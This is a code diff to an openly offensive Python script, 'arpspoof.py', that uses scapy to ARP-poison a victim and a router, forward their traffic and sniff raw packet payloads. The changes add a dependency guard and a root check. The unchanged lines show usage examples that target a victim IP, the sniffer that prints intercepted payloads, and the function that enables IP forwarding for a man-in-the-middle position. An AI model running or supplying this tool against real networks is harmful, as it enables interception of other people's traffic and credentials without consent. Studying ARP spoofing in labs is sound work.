@@ -1,11 +1,17 @@
 import sys,os,getopt
-from scapy.all import *
+try:
+    from scapy.all import *
+except Exception as e:
+    print("Unmet dependency: ", e)
+
+if os.geteuid() != 0:
+    exit("[!] Root privileges are required to run this script.")
 
 def usage():
+
     print("\nARP Spoof/Poison by Dex")
     print()
     print("Usage: arpspoof.py -i <interface> -v <victimip> -r <routerip>")
-    
     print("Example: arpspoof.py -i wlp12s0 -v 192.168.0.32 -r 192.168.0.1")
     print("Example: arpspoof.py -i enp2s0 -v 192.168.0.5 -r 192.168.0.1")
     sys.exit(0)
@@ -36,7 +42,6 @@ def main():
             routerip = sys.argv[6]
         else:
             assert False,"Unhandled Option"
-       
     MiddleMan(interface, routerip, victimip)
 
 def MACget(IP):
@@ -58,7 +63,7 @@ def Restore(routerip, victimip):
 
 def sniffer(interface):
     pkts = sniff(iface = interface, count = 10, prn=lambda x:x.sprintf(" Source: %IP.src% : %Ether.src%, \n %Raw.load% \n\n Reciever: %IP.dst% \n +=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+\n"))
-    
+
 def MiddleMan(interface, routerip, victimip):
     os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
     while 1:
